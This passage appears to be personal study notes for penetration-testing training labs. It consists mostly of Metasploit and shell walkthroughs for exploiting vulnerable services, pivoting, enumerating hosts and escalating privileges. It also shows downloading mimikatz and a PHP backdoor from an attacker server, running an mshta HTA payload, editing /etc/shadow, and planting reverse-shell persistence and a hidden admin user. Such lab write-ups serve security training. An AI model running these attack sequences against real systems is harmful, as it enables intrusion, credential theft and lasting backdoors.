        - `nmap -sV -p 445 10.2.20.205`
        - `nc -nv 10.2.20.205 445`
        - `search smb_version
        use auxiliary/scanner/smb/smb_version
        setg RHOSTS 10.2.20.205
        run`
        - //#searchsploit smaba 3.0.20
        - `use exploit/multi/samba/usermap_script`
        - info
        - set rhosts
        - exploit
        - update to meterpreter
        - sessions -u 1
        - sessions
        - sessions 2
        - meterpreter> sysinfo
        - getuid
        - cat /etc/passwd
        - `cat /etc/shadow`
    - **Obfuscation**
        - Av Evasion with Shellter
        - Obfusxating Powershell Code
            
            
    
- **Post Exploitation**
    
    **Labs:**
    
    - ***Lab: Pivoting***
        
        ```bash
        ping -c 4 demo1.ine.local
        ping -c 4 demo2.ine.local
        nmap demo1.ine.local
        nmap -sV -p80 demo1.ine.local
        searchsploit hfs
        msfconsole -q
        use exploit/windows/http/rejetto_hfs_exec
        set RHOSTS demo1.ine.local
        exploit
        ipconfig
        run autoroute -s 10.0.19.0/20
        
        background
        use auxiliary/scanner/portscan/tcp
        set RHOSTS demo2.ine.local
        set PORTS 1-100
        exploit
        sessions -i 1
        portfwd add -l 1234 -p 80 -r <IP Address of demo2.ine.local>
        portfwd list
        
        nmap -sV -sS -p 1234 localhost
        searchsploit badblue 2.7
        background
        use exploit/windows/http/badblue_passthru
        set PAYLOAD windows/meterpreter/bind_tcp
        set RHOSTS demo2.ine.local
        exploit
        shell
        cd /
        dir
        type flag.txt
        
        ```
        
    - ***Lab : Enumerating System Information - Windows***
        
        In this lab, we explored the process of enumerating system information like the specific OS version and installed updates on a Windows target.
        
        ```bash
        ping -c 4 demo.ine.local
        nmap -sV demo.ine.local
        // 80 is running Rejetto HTTP File Server 2.3
        searchsploit rejetto
        service postgresql start && msfconsole
        use exploit/windows/http/rejetto_hfs_exec
        set RHOSTS demo.ine.local
        exploit
        sysinfo
        shell
        hostname
        systeminfo
        
        //While the systeminfo command provides us with
         a list of installed updates in the form of their HotFix IDs,
         we can also get a list of installed updates on the system with
          more detailed information like when the update
          was installed by running the following command
        
        wmic qfe get Caption,Description,HotFixID,InstalledOn
        
        ```
        
    - ***Lab: Enumerating Users & Groups - Windows***
        
        To cover the process of enumerating users and groups on a Windows target system.
        
        ```bash
        ping -c 4 demo.ine.local
        nmap -sV demo.ine.local
        searchsploit rejetto
        service postgresql start && msfconsole
        use exploit/windows/http/rejetto_hfs_exec
        set RHOSTS demo.ine.local
        exploit
        **meterpreter>**getuid
        getprivs
        background
        
        use post/windows/gather/enum_logged_on_users
        set SESSION 1
        run
        sessions 1
        shell
        whoami
        whoami /priv
        net users
        net user administrator
        net localgroup
        net localgroup administrators
        
        //We now have a good understanding of 
        how many user accounts exist on their system, 
        the groups present and the members of these groups.
        
        ```
        
    - ***Lab: Enumerating Network Information - Windows***
        
         To cover the process of enumerating network information from a Windows target.
        
        ```bash
        nmap -sV demo.ine.local
        searchsploit rejetto
        msfconsole
        use exploit/windows/http/rejetto_hfs_exec
        set RHOSTS demo.ine.local
        exploit
        
        meterpreter>shell
        ipconfig
        ipconfig /all
        route print
        
        //This information is very useful during the pivoting
         phase of post-exploitation as it can reveal network routes.
        
        arp -a
        
        //We can also display the ARP cache to discover
         other IP addresses on the target network
         
        netstat -ano
        
        //We can also view a list of open ports being used by
         services on the target system
        
        ```
        
    - ***Enumerating Processes and Services***
        
        To cover the process of enumerating running processes and services on a Windows target.
        
        ```bash
        //rejeto
        meterpreter>ps
        
        //To begin with, we can enumerate a list of running processes
         on the Windows target by running
        //As shown in the following screenshot, the ps command will display 
        a list of all processes running on the target system in addition to 
        the process IDs (PID), the user and the path to the program.
        //We can also utilize meterpreter to search for specific processes that
         are of interest to you, for example, if we want to locate and identify
          the process ID (PID) of the explorer.exe process,
        
        pgrep explorer.exe
        
        //#Another feature meterpreter provides is the ability to migrate to 
        #a different process via the PID. For example, we can migrate to the explorer.exe
         #process by running the following command:
        
        migrate 2252
        
        #We can enumerate a list of running services by spawning a command shell session
         #and running the following command:
        meterpreter>shell
        net start
        
        #We can learn more about the running services by running the following command:
        wmic service list brief
        #As shown in the following screenshot, this command will display a list of running services in addition to the service name, the ProcessID and the active state of the service.
        #In addition to enumerating running processes and services, we can also enumerate a list of running tasks and the corresponding services for each task.
        
        tasklist /SVC
        
        #Another important piece of information to enumerate is the list of scheduled tasks on the Windows target, this can be done by running the following command:
        
        schtasks /query /fo LIST
        
        #As shown in the following screenshot, the preceding command will enumerate all of the scheduled tasks configured to run on the target system.
        
        ```
        
    - ***Automating Windows Local Enumeration***
        
        This lab covers the process of automating local enumeration on Windows by leveraging various post-exploitation Metasploit modules and local enumeration scripts.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** To automate local enumeration on Windows by leveraging various post-exploitation Metasploit modules and local enumeration scripts.
        
        - Nmap
        - msfconsole
        - JAWS
        - Powershell
        
        ```bash
        nmap -sV -p 5985 demo.ine.local
        # Microsoft HTTPAPI httpd 2.0
        #the Nmap scan reveals that the WinRM port is open on the target system
        #We can gain access to the target system by authenticating with the WinRM server on the target system. This can be done through the use of a Metasploit module.
        
        #To save time, you have been provided with access to the following credentials to gain access to the target system (administrator/tinkerbell).
        msfconsole
        use exploit/windows/winrm/winrm_script_exec
        set RHOSTS demo.ine.local
        set USERNAME administrator
        set PASSWORD tinkerbell
        set FORCE_VBS false
        run
        #got meterpreter session
        #We have now gained access to the Windows system and can begin the process of automating local enumeration on the system.
        
        background
        use post/windows/gather/win_privs
        set SESSION 1
        run
        #useful information like whether the user is admin and whether UAC is enabled or disabled.
        
        use post/windows/gather/enum_logged_on_users
        set SESSION 1
        run
        # enumerate a list of current and previous logged-on users as well as the respective SIDs of the user accounts.
        
        use post/windows/gather/checkvm
        set SESSION 1
        run
        #target system is a virtual machine running on the Xen hypervisor.
        
        use post/windows/gather/enum_applications
        set SESSION 1
        run
        #This information is very useful as it can be used to search for vulnerabilities in the installed programs that can be leveraged or exploited to elevate your privileges or reveal important information. It also gives you an idea of what this system is being used for.
        
        use post/windows/gather/enum_computers
        set SESSION 1
        run
        #enumerate a list of installed updates and patches by using the enum_patches module.
        
        use post/windows/gather/enum_patches
        set SESSION 1
        run
        # enumerates a list of installed patches and updates with their respective HotFixIDs and when they were installed.
        
        #JAWS is an open-source PowerShell script designed to help penetration testers automate local enumeration and identify privilege escalation vectors on Windows systems.
        #To use this script, you will need to copy the script into your lab environment. To begin with, you can access the script through the following GitHub repository: https://github.com/411Hall/JAWS
        #You will now need to copy the content of the script in raw format and paste it into the lab environment clipboard.
        #create a new file with a text editor like Mousepad.
        #save the file as jaws-enum.ps1 
        
        #open meterpreter>
        cd C:\\
        mkdir
        cd temp
        upload /root/Desktop/jaws-enum.ps1
        shell
        powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt
        
        meterpreter>download JAWS-Enum.txt
        #open manually and go /root/ and JAWS-Enum.txt
        
        ```
        
    - ***Enumeration System Information -Linux***
        
        Enumeration in penetration testing is a crucial phase that follows the initial information-gathering stage. It involves actively connecting to the target system to extract detailed information about its structure and the services it offers. This process helps in identifying potential vulnerabilities that can be exploited.
        
        In this lab, we will learn the process of enumerating system information from a target system running Linux.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Enumerate the target machine to gather system information.
        
        **Tools: nmap, msf**
        
        ```bash
        nmap -Pn -A -T4 demo.ine.local
        #21/tcp open  ftp     vsftpd 2.3.4
        searchsploit vsftd 2.3.4
        #it has metasploit exloit
        
        msfconsole
        search vsftd 2.3.4
        use exploit(unix/ftp/vsftpd_234_backdoor)
        set rhosts demo.ine.local
        run
        #got shell
        CTRL + Z
        sessions -u 1
        sessions
        sessions -i 2
        sysinfo
        shell
        /bin/bash -i
        shell$
        hostname
        cat /etc/issue
        cat /etc/*release
        #Linux distro name and release version manually by running 
        # target system is running Debian 9 Stretch.
        
        uname -a
        #target system is 6.8.0-36-generic. This information is very useful as it can be used to identify kernel exploits for this specific version of the Linux kernel that can be used to elevate our privileged if required.
        lscpu
        #list of storage devices attached to the Linux system and information regarding their respective mount points and storage capacity by running
        df -h
        
        ```
        
    - ***Enumeration Users & Groups - Linux***
        
        Enumeration in penetration testing is a crucial phase that follows the initial information-gathering stage. It involves actively connecting to the target system to extract detailed information about its structure and the services it offers. This process helps in identifying potential vulnerabilities that can be exploited.
        
        In this lab, we will learn the process of enumerating users & groups information from a target system running Linux.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Enumerate the target machine to gather users & groups information.
        
        **Tools: nmap, msf**
        
        ```bash
        nmap -Pn -A -T4 demo.ine.local
        #21/tcp open  ftp     vsftpd 2.3.4
        searchsploit vsftd 2.3.4
        #it has metasploit exloit
        
        msfconsole
        search vsftd 2.3.4
        use exploit(unix/ftp/vsftpd_234_backdoor)
        set rhosts demo.ine.local
        run
        #got shell
        CTRL + Z
        sessions -u 1
        sessions
        sessions -i 2
        sysinfo
        shell
        /bin/bash -i
        
        $groups root
        cat /etc/passwd
        groups
        who
        lastlog
        
        ```
        
    - ***Enumeration Network Information -Linux***
        
        Enumeration in penetration testing is a crucial phase that follows the initial information-gathering stage. It involves actively connecting to the target system to extract detailed information about its structure and the services it offers. This process helps in identifying potential vulnerabilities that can be exploited.
        
        In this lab, we will learn the process of enumerating network information from a target system running Linux.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Enumerate the target machine to gather network information.
        
        Tools: nmap , msf
        
        ```bash
        nmap -Pn -A -T4 demo.ine.local
        #21/tcp open  ftp     vsftpd 2.3.4
        searchsploit vsftd 2.3.4
        #it has metasploit exloit
        
        msfconsole
        search vsftd 2.3.4
        use exploit(unix/ftp/vsftpd_234_backdoor)
        set rhosts demo.ine.local
        run
        #got shell
        CTRL + Z
        sessions -u 1
        sessions
        sessions -i 2
        #meterpreter
        sysinfo
        getuid, ifconfig, netstat, route
        
        background
        sessions -i 1
        /bin/bash -i
        ip a s
        cat /etc/networks
        cat /etc/hosts
        cat /etc/resolv.conf
        #identify default DNS name server address
        
        ```
        
    - ***Enumeration Processes and Cron Jobs***
        
        Enumeration in penetration testing is a crucial phase that follows the initial information-gathering stage. It involves actively connecting to the target system to extract detailed information about its structure and the services it offers. This process helps in identifying potential vulnerabilities that can be exploited.
        
        In this lab, we will learn the process of enumerating processes & cron jobs information from a target system running Linux.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** Enumerate the target machine to gather processes & cron jobs information.
        
        Tools: nmap , msf
        
        ```bash
        nmap -Pn -A -T4 demo.ine.local
        #21/tcp open  ftp     vsftpd 2.3.4
        #got meterpreter
        meterpreter>ps
        #  display a list of all running processes and their respective process IDs (PIDs).
        #list of running processes on the target system
        pgrep vsftpd
        
        #The target system does not have the crontab utility installed, as a result, you will need to run the following commands on the Kali Linux system.
        
        background
        ls -al /etc/cron*
        #In this lab, we learned about enumerating the processes & cron jobs information from a target system running Linux.
        ```
        
    - ***Automating Linux Local Enumeration***
        
        This lab covers the process of automating local enumeration on Linux by leveraging various Metasploit post-exploitation modules and local enumeration scripts.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at demo.ine.local.
        
        **Objective:** To automate local enumeration on Linux by leveraging various post-exploitation Metasploit modules and local enumeration scripts.
        
        - Nmap
        - Metasploit Framework
        - LinEnum
        
        ```bash
        nmap -sV demo.ine.local
        #port 80 http://demo.ine.local   ./getting_cgi shellshock
        # web application that is vulnerable to the ShellShock exploit that can be exploited through the use of a Metasploit exploit module.
        
        msfconsole
        use exploit/multi/http/apache_mod_cgi_bash_env_exec
        set RHOSTS demo.ine.local
        set TARGETURI /gettime.cgi
        set LHOST 192.58.2.2
        exploit
        #got meterpreter>
        background
        
        use post/linux/gather/enum_configs
        set SESSION 1
        run
        #enumerate a list of configuration files on the Linux target that can be analyzed to learn more about the target system.
        
        use post/linux/gather/enum_network
        set SESSION 1
        run
        #enumerate networking information from the target system and will store it in the local Metasploit root directory.
        
        use post/linux/gather/enum_system
        set SESSION 1
        run
        #enumerate information like the Distribution name and release version in addition to other system information like the version of the Linux kernel and user accounts which will all be stored in the loot directory for offline analysis.
        
        #Now that we have explored how to use Metasploit modules to automate local enumeration on a Windows target, we can begin exploring how to use LinEnum.
        #LinEnum is a bash script that is used by penetration testers to automate local enumeration and identify privilege escalation vectors on Linux systems.
        #To use this script, you will need to copy the script into your lab environment. To begin with, you can access the script through the following GitHub repository: https://github.com/rebootuser/LinEnum
        #Once you have copied the script from the GitHub repo, navigate back to the Kali Linux system in your lab environment and create a new file with a text editor like leafpad.
        #Then paste in the script you copied in the file, after which save the file as LinEnum.sh 
        
        #meterpreter>
        cd /tmp
        upload /root/Desktop/LinEnum.sh
        shell
        /bin/bash -i
        chmod +x LinEnum.sh
        ./LinEnum.sh
        #LinEnum.sh script will run and will display the results in the terminal.
        
        #Take a few minutes to go through the output and analyze what information LinEnum was able to enumerate in addition to any potentially interesting information that we were unable to enumerate manually or with Metasploit modules.
        
        ```
        
        In this lab, we explored automating local enumeration on a Linux system by leveraging Metasploit post-exploitation modules and local enumeration scripts like LinEnum.
        
    - ***Setting Up A Web Server with Python***
        
        This lab provides a practical demonstration of setting up a web server using Python's HTTP Server module on a Kali Linux machine, aimed at facilitating file transfers from an attacker's system to a target system.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** To cover the process of setting up a web server with Python to facilitate files from an attacker's system to the target system.
        
        Tools
        
        - Python
        - Firefox
        
        ```bash
        nmap -Pn -A -T4 demo.ine.local
        #80/tcp    open  http               HttpFileServer httpd 2.3
        
        python -m SimpleHTTPServer 80
        #python3 -m http.server 8080
        http://eth1
        #got file 
        
        **python** → Calls the Python interpreter (in many systems, this points to Python 2).
        
        **-m** →     Runs a module as a script.
        
        **SimpleHTTPServer** → This was the name of the built-in module in Python 2 for serving files over HTTP (in Python 3, it was renamed to http.server).
        
        **80** → Port number where the server will listen.
        
        ```
        
    - ***Transferring Files to Windows Targets***
        
        This lab demonstrates how to transfer files to a Windows target by leveraging a web server running on a Kali Linux system to exploit vulnerabilities, gain access, and facilitate file transfers.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        **Objective:** To cover the process of transferring files to Windows targets by leveraging a web server running on the Kali Linux system.
        
        Tools:
        
        - Nmap
        - searchsploit
        - msfconsole
        - python3
        
        ```bash
        nmap -sV demo.ine.local
        #80/tcp    open  http               HttpFileServer httpd 2.3
        searchsploit HttpFileServer 
        #rejetto
        
        msfconsole
        search rejetto
        use exploit/windows/http/rejetto_hfs_exec
        set RHOSTS demo.ine.local
        exploit
        #got meterperter 
        cd C:\\
        mkdir Temp
        cd Temp
        shell
        
        #open anothe terminal
        cd /usr/share/windows-resources/mimikatz/x64
        python3 -m http.server 80
        
        #go to shell
        
        C:\Temp> certutil -urlcache -f http://10.10.31.3/mimikatz.exe mimikatz.exe
        
        dir
        #mimikatz.exe successfully uploaded
        
        ```
        
        In this lab, we explored the process of transferring files from a web server being hosted on Kali Linux to a Windows target with the certutil utility.
        
    - ***Transferring Files to Linux Targets***
        
        Transferring files to a target system is a common and essential task in penetration testing and post-exploitation activities. This can be done for various purposes, such as uploading tools, scripts, or payloads to facilitate further exploitation, data exfiltration, or persistence mechanisms. This lab covers the process of transferring files to Linux targets by leveraging a web server running on the Kali linux system.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable service will be accessible at **demo.ine.local**.
        
        **Objective:** Exploit the vulnerable service using suitable Metasploit module and then transfer files to the Linux target by leveraging a web server running on the Kali machine.
        
        Tools:
        
        - Nmap
        - Metasploit Framework
        - Python
        - Wget
        
        ```bash
         nmap -Pn -A -T4 demo.ine.local
        #139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
        #445/tcp open  netbios-ssn Samba smbd 4.1.17 (workgroup: WORKGROUP)
        
        msfconsole
        search samba/is_
        use exploit/linux/samba/is_known_pipename 
        set rhosts demo.ine.local
        exploit
        #got shell
        #ctrl + Z
        y
        sessions -u 1
        sessions 
        sessions -i 1
        #got meterpreter
        sysinfo
        getuid
        shell
        $
        
        #open another terminal
        cd /usr/share/webshells/php/
        python3 -m http.server 80
        
        #again goto shell
        
        root@demo:/tmp# wget http://192.146.189.2/php-backdoor.php
        #upload php-backdoor.php
        
        #wget — a command-line tool that downloads files over HTTP/HTTPS.
        ```
        
        In this lab, we explored the process of transferring files from a web server being hosted on Kali Linux to a Linux target with the wget utility.
        
    - ***Upgrading Non-Interactive Shells***
        
        Upgrading non-interactive shells to interactive ones is an important technique during penetration testing and post-exploitation to gain better control and functionality on the target system. Shells obtained via netcat or certain reverse shell payloads often lack interactive TTY capabilities. In this lab, we will explore the process of upgrading non-interactive shells on a target system running Linux.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable service will be accessible at **demo.ine.local**.
        
        **Objective:** Exploit the vulnerable service using suitable Metasploit module and then upgrade the non-interactive shell.
        
        Tools:
        
        - Nmap
        - Metasploit Framework
        - Python
        
        PTY (pseudo-terminal) is a software emulation of a physical TTY (teletypewriter) terminal, providing interactive shell access.
        
        ```bash
        
         nmap -Pn -A -T4 demo.ine.local
        #139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
        #445/tcp open  netbios-ssn Samba smbd 4.1.17 (workgroup: WORKGROUP)
        
        msfconsole
        search samba/is_
        use exploit/linux/samba/is_known_pipename 
        set rhosts demo.ine.local
        exploit
        #got shell
        #ctrl + Z
        y
        sessions -u 1
        sessions 
        sessions -i 1
        #got meterpreter
        sysinfo
        getuid
        shell
        $   
        
        python -c 'import pty; pty.spawn("/bin/bash")'
        ```
        
    - ***Windows : PrivescCheck***
        
        This lab covers the usage of [PrivescCheck.ps1](https://github.com/itm4n/PrivescCheck) script to find a common Windows privilege escalation flaw. The **PrivescCheck** script enumerates common Windows configuration issues that can be leveraged for local privilege escalation. It also gathers various information that might be useful for exploitation and/or post-exploitation.
        
        In this lab environment, you will be provided with GUI access to a Kali machine and a target Windows machine. The target machine will be accessible at **demo.ine.local**.
        
        Your task is to run **PrivescCheck.ps1** script to find a common Windows privilege escalation flaw that depends on misconfigurations.
        
        **Objective:** Gain Administrator user privilege and find the flag.
        
        - PrivescCheck.ps1
        - Metasploit Framework
        - Powershell
        
        ```bash
        #Open Victim windows machine machine
        #Powershell
        cd C:\Users\student\Desktop\PrivescCheck
        ls
        #It has privescCheck.ps1 
        powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
        #we can notice that we found WinLogon credentials. Investigate WinLogon output.
        #administrator user credential. i.e administrator:hello_123321.
        
        runas.exe /user:administrator cmd
        hello_123321
        whoami
        #We are running cmd.exe as an administrator.
        
        #swith kali machine
        #Running the hta_server module to gain the meterpreter shell. Start msfconsole.
        msfconsole -q
        use exploit/windows/misc/hta_server
        exploit
        #This module hosts an HTML Application (HTA) that when opened will run a payload via Powershell.”
        #Copy the generated payload i.e “http://10.10.31.2:8080/Rv4eiCTge85UJ15.hta” and run it on cmd.exe with mshta command to gain the meterpreter shell.
        
        #goto victim windows machine 
        mshta.exe http://10.10.31.2:8080/Rv4eiCTge85UJ15.hta
        #got meterpreter in kali and goto kali
        
        #meterpreter 1
        
        sessions -i 1
        cd C:\\Users\\Administrator\\Desktop
        dir
        cat flag.txt
        
        ```
        
    - ***Permissions Matter!***
        
        The admin was tasked to create a replica of an existing Linux system. He copied the entire filesystem to his computer, made modifications to some files and then copied it onto the newly provisioned system. Unfortunately, in his haste to set the new system up, he forgot to take care of permission sets.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. A terminal access to the target machine is provided at target.ine.local:8000, which you can access over the browser in Kali.
        
        **Objective:** Your mission is to get a root shell on the box and retrieve the flag!
        
        Tools:
        
        - Nmap
        - Browser (firefox)
        
        ```bash
        http://target.ine.local:8000
        find / -not -type l -perm -o+w
        #got /etc/shadow
        #check is it writable?
        ls -l /etc/shadow
        cat /etc/shadow
        #Observe that the root password is not set. Adding a known password in the shadow file can escalate to root. Use openssl to generate a password entry.
        
        openssl passwd -1 -salt abc password
        # Copy the generated entry and add it to the root record in /etc/shadow
        
        vim /etc/shadow
        root:enter generted text and :wq
        
        su
        #Enter password: password
        cd /root
        ls -l
        cat flag
        
        ```
        
    - ***Editing Gone Wrong***
        
        You have managed to get access to the "student" account on the client's server. This is bad enough as all the student resources are available to you. You are now trying to escalate privileges to get root. After some digging around and from other sources, you figure out that the same person in the organization uses both the student account and the root account on the system.
        
        Your mission is to escalate privileges, get a root shell on the box and retrieve the flag!
        
        In this lab environment, you will be provided with GUI access to a Kali machine. A terminal access to the target machine is provided at **target.ine.local:8000**, which you can access over the browser in Kali.
        
        **Objective:** Your task is to escalate privileges on the target machine, get a root shell on the box and retrieve the flag!
        
        Tools: firefox
        
        ```bash
        http://target.ine.local:8000
        #got a command windows
        
        find / -user root -perm -4000 -exec ls -ldb {} \;
        #There is no specific hint given in this challenge, so start with finding setuid program approach.
        # No anomaly is there. Move on to finding misconfigured sudo. Check the current sudo capabilities.
        
        sudo -l
        #The man entry depicts that the man command can be run using sudo without providing any password. Run it and launch /bin/bash from it.
        sudo man ls
        
        !/bin/bash
        
        #Observe that the escalation to root user is successful. Change to /root directory and retrieve the flag.
        cd /root
        ls -l
        cat flag
        
        ```
        
    - ***CTF 1***
        
        Post-Exploitation refers to the phase in a penetration test or cyberattack that occurs after an attacker successfully gains access to a system or network. During this phase, the attacker aims to maximize the value of their access by escalating privileges, maintaining persistence, and gathering sensitive information. Post-exploitation techniques include pivoting to other systems, extracting passwords, exfiltrating confidential data, and leveraging compromised systems to further penetrate the network. The goal is to identify critical assets, assess the extent of the breach, and map out pathways for potential lateral movement within the target environment. Post-exploitation also focuses on covering tracks to evade detection and ensuring continued access, emphasizing the need for strong monitoring and rapid response mechanisms to prevent further compromise.
        
        This lab is designed to challenge and refine your skills in Post-Exploitation techniques, focusing on identifying and uncovering hidden information within a target machine.
        
        In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at **http://target1.ine.local** and **http://target2.ine.local**.
        
        **Objective:** Execute Post-Exploitation techniques on the target to uncover hidden flags and fully exploit the compromised environment.
        
        **Flags to Capture:**
        
        - **Flag 1**: The file that stores user account details is worth a closer look. (target1.ine.local)
        - **Flag 2**: User groups might reveal more than you expect.
        - **Flag 3**: Scheduled tasks often have telling names. Investigate the cron jobs to uncover the secret.
        - **Flag 4**: DNS configurations might point you in the right direction. Also, explore the home directories for stored credentials.
        - **Flag 5**: Use the discovered credentials to gain higher privileges and explore the root's home directory on target2.ine.local.
        
        Tools:
        
        - Nmap
        - FTP
        - OpenSSL
        
        ```bash
        **//Flag1**
        
        nmap -sC -sV target1.ine.local
        #port 22 ssh libssh 
        
        service postgresql start && msfconsole
        workspace -a work
        search libssh
        use auxiliary/scanner/ssh/libssh_auth_bypass
        set rhosts target1.ine.local
        set SPAWN_PTY true
        exploit
        #got shell
        sessions
        sessions 1
        cat /etc/passwd
        #need to enumerate the file that stores user account details. In Linux, user account information is stored in the /etc/passwd file
        #got first flag
        
        **//Flag2**
        
        cat **/etc/group**
        #enumerate the users by checking the /etc/group file
        #got 2nd flag
        
        **//Flag3**
        
        cd **/etc/cron.d**
        ls
        #need to enumerate the cron jobs, which are located in the /etc directory.
        
        #got the flag
        
        **//Flag4**
        
        #The DNS configuration is located in the /etc/resolv.conf file
        cat /etc/resolv.conf
        #This file does not contain a flag, but it points to the host configuration
        #navigate to the hosts file
        
        cat /etc/hosts
        
        #got flag
        
        **//Flag5**
        
        #from target1.ine.local shell got credentials.txt
        #john:Pass@john123
        nmap -sC -sV target2.ine.local
        #Port 22 is open. Let’s connect to the john user via SSH 
        
        ssh john@target2.ine.local
        pass:Pass@john123
        
        #got john shell
        cd /root
        #permission denied
        
        #To check for any writable files on the system
        find / -not -type l -perm -o+w
        #found that /etc/shadow has writable permissions
        
        cat /etc/shadow
        
        #t the top of the file, the root entry contains an * mark, indicating no password is set. To gain access, we need to generate a hashed password and replace it. Use the command to create a hashed password
        openssl passwd -1 -salt abc **password**
        #The command openssl passwd -1 -salt abc password is used to generate a hashed password using the MD5-based crypt algorithm (-1 option). Here’s a breakdown of each part:
        
        openssl passwd → Generates a hashed password.
        -1 → Specifies the MD5-based crypt algorithm ($1$ format).
        -salt abc → Uses "abc" as the salt (a random string added to the password before hashing to enhance security).
        password → The plain-text password to be hashed.
        
        #Copy the generated salted password and paste it into the /etc/shadow file using a text editor like nano or vim. Since we’re using nano, run the command:nano /etc/shadow
        nano /etc/shadow
        #past in * the copy from openssl
        cat /etc/shadow   //its ok
        #type su, and enter the password “password” when prompted.
        john@target2:$ su
        pass: password
        cd /root
        ls
        cat flag.txt
        
        ```
        
    - ***Maintaining Access: Persistence Service***
        
        **Persistence** is the attacker goal of *keeping access to a compromised host or environment over time* — surviving reboots, credential resets, or casual cleanup. In pentesting/red-teaming it’s used to emulate real adversaries so defenders can find and remove persistent backdoors.
        
        Metasploit is a widely used penetration testing framework that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. In this lab, we will learn about a way of maintaining persistent access to the target machine using the Metasploit module.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        Your task is to fingerprint the application using the tools available on the Kali machine and exploit the application using the appropriate Metasploit module.
        
        Then, use the exploit/windows/local/persistence_service local exploit module to maintain access.
        
        **Objective:** Exploit the application and maintain access using the Metasploit module.]
        
        Tools:
        
        - Nmap
        - Metasploit Framework
        
        ```bash
        
        nmap -Pn -A -T4 demo.ine.local
        #port 80 
        nmap -sV -p 80 demo.ine.local
        #HttpFileServer hsf
        searchsploit HttpFileServer
        #rejetto meterpreter
        
        msfconsole -q
        use exploit/windows/http/rejetto_hfs_exec
        set RHOSTS demo.ine.local
        set LHOST <Make Sure to Enter Valid LHOST IP Address>
        exploit
        #We have successfully exploited the target vulnerable application (hfs) and received a meterpreter shell.
        getuid    //not NT authority
        sysinfo 
        
        background
        use exploit/windows/local/persistence_service
        set SESSION 1
        exploit
        
        #got NT authority and this is high priv
        #By default persistence, the local exploit module uses the following payload and local port for reverse connection:
        Payload: windows/meterpreter/reverse_tcp
        LHOST: Attack IP Address.
        LPORT: 4444
        
        msfconsole -q
        use exploit/multi/handler
        set LHOST <Attacker Kali Machine IP>
        set PAYLOAD windows/meterpreter/reverse_tcp
        set LPORT 4444
        exploit
        # We have successfully maintained access. 
        #Start another msfconsole and run multi handler to re-gain access.
        #Switch back to the active meterpreter session and reboot the machine.
        
        session -i 1
        reboot
        #Once the machine reboots we would expect a new meterpreter session without re-exploitation. This happened because we have added a malicious executable for maintaining access.
        #We have received a new meterpreter session with the highest privileged.
        #Also, the backdoor is running as a service. Even if the session gets killed we would again gain it by re-running the Metasploit multi-handler. In this case, we exit the session and run the handler to gain the session again
        
        exit
        exploit
        #In this lab, we learned about a way of maintaining persistent access to the target machine.
        
        ```
        
    - ***Maintaining Access: RDP***
        
        This lab demonstrates how to fingerprint and exploit a vulnerable application on a target machine and maintain access using Remote Desktop Protocol (RDP).
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine running a vulnerable application will be accessible at **demo.ine.local**.
        
        Your task is to fingerprint the application using the tools available on the Kali machine and then exploit the application using the appropriate Metasploit module. Then use RDP (Remote Desktop Protocol) to maintain access to the target machine.
        
        **Objective:** Exploit the application and maintain access using RDP.
        
        - Nmap
        - Metasploit Framework
        - xfreerdp
        
        ```bash
        
        nmap demo.ine.local
        #port 80 is open
        nmap -sV -p 80 demo.ine.local
        #Badblue 2.7
        # We will search the exploit module for badblue 2.7 using searchsploit.
        #searchsploit badblue 2.7
        
        msfconsole -q
        use exploit/windows/http/badblue_passthru
        set RHOSTS demo.ine.local
        exploit
        
        #We have successfully exploited the target vulnerable application (badblue) and received a meterpreter shell.
        meterpreter>getuid, sysinfo      //not NT authority
        
        #We can observe that we are running as an administrator user. Migrate the process in explorer.exe. First, search for the PID of explorer.exe and use the migrate command to migrate the current process in that process.
        ps -S explorer.exe
        migrate 2764
        
        #We have successfully migrated into the explorer.exe process. We are going to maintain access by RDP. We will be creating a user and adding that user to the Administrators group. All this can be done using the "getgui" meterpreter command.
        #The ‘getgui’ command makes the below changes to the target machine:
        
        //Enable RDP service if it’s disabled
        Creates new user for an attacker
        Hide user from Windows Login screen
        Adding created user to "Remote Desktop Users" and "Administrators" groups//
        
        **run getgui -e -u alice -p hack_123321**
        #user:alice pass: hack_123321
        
        xfreerdp /u:alice /p:hack_123321 /v:demo.ine.local
        
        Y [Accept the certificate]
        
        #We have gained access to the target machine GUI by RDP using the "alice" user. Now, if the machine is rebooted the access would remain the same after the machine comes online.
        
        ```
        
        This lab successfully guides through the process of identifying and exploiting a vulnerable application, followed by maintaining access to the target machine via RDP.
        
    - ***Maintaining Access I***
        
        SSH (Secure Shell) is a network protocol that allows secure access to remote systems over an unsecured network. It provides encrypted communication between a client and a server, typically used for remote administration, file transfers, and tunneling.
        
        In this lab, we will look at how we can maintain access on the target machine after the credentials are modified, using SSH related artifacts.
        
        In this lab environment, you will be provided with GUI access to a Kali machine. The target machine will be accessible at **demo.ine.local**.
        
        You are given SSH access on the target machine. The flag is not on the machine yet and will only be available in the user's home directory after "wait" file present in the user's home directory is deleted. However, deletion of this file will change the user password and restart SSH. Hence, to retrieve the flag, you have to maintain access on the target system.
